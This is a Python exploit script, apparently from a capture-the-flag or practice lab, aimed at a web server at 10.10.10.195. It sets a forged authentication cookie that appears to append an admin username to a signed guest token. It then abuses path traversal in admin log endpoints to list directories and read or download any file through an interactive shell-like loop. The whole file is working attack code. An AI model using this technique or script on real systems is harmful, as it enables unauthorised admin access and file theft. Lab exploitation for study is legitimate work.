from ast import literal_eval
import os
import re
import requests

s = requests.Session()
cookie_obj = requests.cookies.create_cookie(name='auth', value='dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNQ==.gfUqipj3golZDwwLLI/NmmDrSZy7BZ6tUn28jU6FpKA=')
s.cookies.set_cookie(cookie_obj)

def read_dir(path):
    res = s.post("http://10.10.10.195/admin/log/dir", data={"logdir": os.path.join("../../../../../../../", path.strip("/"))})
    if res.status_code != 200 or res.text.startswith("Can't find"):
        return None

    return literal_eval(res.text)

def read_file(path):
    res = s.post("http://10.10.10.195/admin/log/view", data={"logfile": os.path.join("../../../../../../../", path.strip("/"))})
    if res.status_code != 200 or res.content.startswith(b"Can't find"):
        return None

    return res.content

cwd = "/"
while True:
    print("Listing for " + cwd + ":")
    contents = read_dir(cwd)
    for entry in contents:
        print("|_ " + entry)

    print("\nAvailable commands: \"cd <path>\", \"cat <file>\", \"wget <file>\", \"exit\".")

    readline = input(">>> ")
    if readline == "exit":
        print("Exiting...\n")
        break

    command = re.match(r"^(\w+) (.+)$", readline)
    binary = command.group(1)
    path = command.group(2)
    path = os.path.join(cwd, path) if not path.startswith("/") else path

    if binary == "cd":
        if read_dir(path) == None:
            print("The directory doesn't exist or you don't have a permission to read it\n")
            continue

        cwd = os.path.abspath(path)

    elif binary == "wget" or binary == "cat":
        file = read_file(path)
        if file == None:
            print("The file doesn't exist or you don't have a permission to read it\n")
            continue

        if binary == "wget":
            print("Writing to %s...\n" % path.split("/").pop())
            with open(path.split("/").pop(), "wb") as output:
                output.write(file)

        elif binary == "cat":
            print(file)
            print()
